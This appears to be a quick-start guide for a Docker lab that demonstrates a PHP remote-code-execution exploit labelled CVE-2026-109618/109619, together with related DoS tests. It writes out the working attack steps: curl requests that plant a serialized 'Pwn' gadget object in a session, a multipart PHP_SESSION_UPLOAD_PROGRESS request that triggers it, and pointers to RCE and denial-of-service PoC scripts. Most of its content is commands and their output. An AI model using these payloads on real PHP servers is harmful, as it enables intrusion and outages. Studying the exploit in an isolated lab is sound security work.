# 🚀 Quick Start Guide - CVE-2026-109618/109619

## ✅ Launch External Terminals (RECOMMENDED)

**One command to launch both terminals side-by-side:**

```bash
cd /home/kali/php2shell-testing
./launch_terminals.sh
```

This will open:
- **Terminal 1 (LEFT)**: Docker logs monitor with color-coded output
- **Terminal 2 (RIGHT)**: Interactive exploit demonstration

Press **Enter** in Terminal 2 to advance through each phase.

---

## 📋 Manual Launch (If Preferred)

### Terminal 1: Docker Logs
```bash
cd /home/kali/php2shell-testing
./run_docker_logs.sh
```

### Terminal 2: Exploit
```bash
cd /home/kali/php2shell-testing  
./run_exploit_demo.sh
```

---

## 🎯 What You'll See

### Terminal 1 (Docker Logs Monitor)
```
╔═══════════════════════════════════════════════════════════════╗
║         TERMINAL 1: Docker Container Logs Monitor            ║
╚═══════════════════════════════════════════════════════════════╝

Container: php2shell-test
Image:     php:8.3.12-apache (VULNERABLE)
Port:      8888
Flag:      /flag.txt

[✓] Container is RUNNING

═══════════════════════════════════════════════════════════════
Monitoring logs for exploit activity...
═══════════════════════════════════════════════════════════════

Watch for:
  ✓ Session write operations
  ✓ Upload progress handler triggers
  ✓ Gadget class loading
  ✓ Pwn::__wakeup() execution
  ✓ FLAG{...} output

[LIVE LOGS - Starting now...]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📝 [php:notice] ✅ Gadget class auto-prepended
   172.17.0.1 - - [23/Oct/2026:13:28:55 +0000] "POST /session_writer.php HTTP/1.1" 200
📤 172.17.0.1 - - [23/Oct/2026:13:28:55 +0000] "POST /upload.php HTTP/1.1" 200
```

### Terminal 2 (Exploit Execution)
```
╔═══════════════════════════════════════════════════════════════╗
║            TERMINAL 2: Exploit Demonstration                 ║
╚═══════════════════════════════════════════════════════════════╝

Target:  http://localhost:8888
Attack:  CVE-2026-109618 / CVE-2026-109619
Method:  Session poisoning + Upload progress RCE

═══════════════════════════════════════════════════════════════
PHASE 1: Environment Verification
═══════════════════════════════════════════════════════════════

Checking Docker container status
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$ sudo docker ps | grep php2shell-test

php2shell-test | Up 15 minutes | 0.0.0.0:8888->80/tcp

Verifying PHP version
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$ curl -s http://localhost:8888/ | grep -o 'PHP Version [0-9.]*'

PHP Version 8.3.12

Confirming flag exists
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

$ sudo docker exec php2shell-test cat /flag.txt

FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}

Press Enter to continue to Phase 2...
```

---

## 🎓 Phases Demonstrated

1. **Environment Verification** - Check container, PHP version, flag
2. **Session Poisoning** - Inject serialized Pwn object
3. **Upload Progress Trigger** - Send multipart exploit request
4. **Flag Capture** - Execute shell command via RCE
5. **Additional Options** - DoS tests, session inspection, more PoCs

---

## 📊 Expected Results

### ✅ Session Poisoning
```bash
[✓] Session poisoned successfully!
Session data written. Session ID: exploit762110fe472498889798076af3cb94
Session file: /tmp/sessions/sess_exploit762110fe472498889798076af3cb94

Session file contents:
exploit|s:45:"O:3:"Pwn":1:{s:3:"cmd";s:13:"cat /flag.txt";}";
```

### ✅ Flag Captured
```
╔═══════════════════════════════════════════════════════════════╗
║                    🏁 FLAG CAPTURED 🏁                        ║
╚═══════════════════════════════════════════════════════════════╝

    FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}
```

---

## 🔍 Commands Shown in Terminal 2

All commands are displayed before execution:

```bash
$ curl -X POST 'http://localhost:8888/session_writer.php' \
    --cookie "PHPSESSID=exploit762110..." \
    --data 'data=O:3:"Pwn":1:{s:3:"cmd";s:13:"cat /flag.txt";}'

$ sudo docker exec php2shell-test cat /tmp/sessions/sess_exploit762110...

$ curl -X POST 'http://localhost:8888/upload.php' \
    --cookie "PHPSESSID=exploit762110..." \
    -F "PHPSESSID=exploit762110..." \
    -F "PHP_SESSION_UPLOAD_PROGRESS=exploit" \
    -F "file=@/tmp/exploit_test_file.txt"

$ sudo docker exec php2shell-test cat /flag.txt
```

---

## 🎨 Color Coding in Terminal 1

- 🎯 **Magenta** - Pwn class activity
- 🏁 **Green** - FLAG mentions
- ⚙️ **Cyan** - Gadget class activity
- 📝 **Yellow** - Session operations
- ⚠️ **Red** - Errors/warnings
- 📤 **Blue** - Upload activity

---

## 🔧 Troubleshooting

### If terminals don't open automatically:

**Option 1: Run scripts manually in separate terminals**
```bash
# Terminal 1
cd /home/kali/php2shell-testing && ./run_docker_logs.sh

# Terminal 2
cd /home/kali/php2shell-testing && ./run_exploit_demo.sh
```

**Option 2: Use Python demonstration**
```bash
cd /home/kali/php2shell-testing
python3 final_exploit.py
```

### If container isn't running:
```bash
sudo docker start php2shell-test
```

### To rebuild container:
```bash
sudo docker stop php2shell-test
sudo docker rm php2shell-test
cd /home/kali/php2shell-testing
sudo docker build -t php2shell-vuln:latest .
sudo docker run -d --name php2shell-test -p 8888:80 php2shell-vuln:latest
```

---

## 📁 Additional PoCs

After the main demonstration, try:

### 1. DoS Interactive Console
```bash
cd PHP-uniDoS
python3 interactive.py http://localhost:8888/upload.php
```

Commands:
- `DoS> 109618` - Test OOM attack
- `DoS> session` - Test worker crash
- `DoS> dos` - Sustained DoS

### 2. Comprehensive RCE PoC
```bash
cd php2shell-poc
python3 poc_rce.py --help
```

### 3. Full Lab (Requires building PHP from source)
```bash
cd php2shell-poc/lab
./build_vuln_php.sh    # 30+ minutes
./build_gadget.sh
./run_lab.sh 9032
```

---

## ✅ Success Indicators

You've successfully exploited CVE-2026-109618/109619 when you see:

✅ Session file created with serialized Pwn object
✅ Multipart request sent with PHP_SESSION_UPLOAD_PROGRESS
✅ Flag captured: `FLAG{php2shell_CVE_2026_109618_109619_pwned_successfully}`
✅ Docker logs showing exploit activity

---

## 🎯 Ready!

Everything is set up. Run:

```bash
cd /home/kali/php2shell-testing
./launch_terminals.sh
```

And press Enter in Terminal 2 to start! 🚀
